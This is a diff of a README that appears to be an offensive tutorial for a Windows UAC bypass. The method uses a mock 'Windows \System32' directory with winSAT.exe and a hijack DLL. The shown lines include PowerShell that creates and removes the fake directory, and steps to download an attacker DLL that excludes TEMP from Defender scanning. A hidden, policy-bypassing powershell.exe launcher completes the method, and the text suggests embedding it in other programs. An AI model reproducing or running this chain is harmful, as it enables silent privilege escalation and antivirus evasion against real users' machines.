@@ -55,7 +55,7 @@ BOOL APIENTRY DllMain(
 This should execute some powershell code as admin.\
 Next we need to find some autoelavate applications. I prefer to use winSAT.exe as there is no visual GUI when ran. Heres some other <a href="#auto-elavate-applications">Auto elavate applications</a>.
 
-Okay so the powershell source code
+Okay so the you need to edit the powershell source code
 ```powershell
 New-Item '\\?\C:\Windows \System32' -ItemType Directory
 Set-Location -Path '\\?\C:\Windows \System32'
@@ -67,12 +67,14 @@ Remove-Item '\\?\C:\Windows \' -Force -Recurse
 ```
 First modification:\
 Build your DLL using visual studio code and upload it to filebin. My DLL adds a windows defender preference to not scan the TEMP directory\
-Replace the Invoke-WebRequest Uri with your link and replace the copy argument with the location of your application.\
+Replace the Invoke-WebRequest Uri with your link and replace the copy argument with the location of your windows application.\
 Now for the final step - Replace every new line with a semicolon and convert it into a batch script
 ```cmd
 powershell.exe -windowstyle hidden -NoProfile -ExecutionPolicy bypass -Command "Yourcodehere"
 ```
-And boom! You can execute that system command and program a UAC bypass payload in most high level languages!
+And boom! You can execute that system command bypass UAC!
+
+Remember - you can program this into most high level languages - as all you need to do is execute a system command!
 
 ---
 <br>
